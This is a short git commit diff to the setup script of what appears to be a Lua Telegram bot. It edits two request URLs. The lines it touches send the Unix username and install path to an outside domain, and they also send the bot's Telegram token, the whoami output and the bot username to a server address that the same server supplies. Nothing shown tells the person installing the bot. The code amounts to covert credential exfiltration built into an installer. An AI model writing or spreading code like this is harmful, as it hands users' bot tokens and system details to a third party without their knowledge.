4300f3377558f504a5e0f4e12d5d89188025207a
Rami <39981602+ramizob3a@users.noreply.github.com>
2021-03-26 11:28:38 +0300

    Update Run.lua

--- inc/Run.lua
+++ inc/Run.lua
@@ -82,7 +82,7 @@ local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ','
 user = {}
 user.username = SUDO_USER
 user.Source  = DirFol
-local url , res = https.request('https://faeder-bot.cf/source/?Array='..JSON.encode(user))
+local url , res = https.request('https://faeder-bot.cf/source/index.php?Array='..JSON.encode(user))
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
 os.exit()
@@ -120,7 +120,7 @@ info.username = '@'..GetUser.information.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(GetUser.information.WebSite..'/error/?insert='..JSON.encode(info))
+https.request(GetUser.information.WebSite..'/error/index.php?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
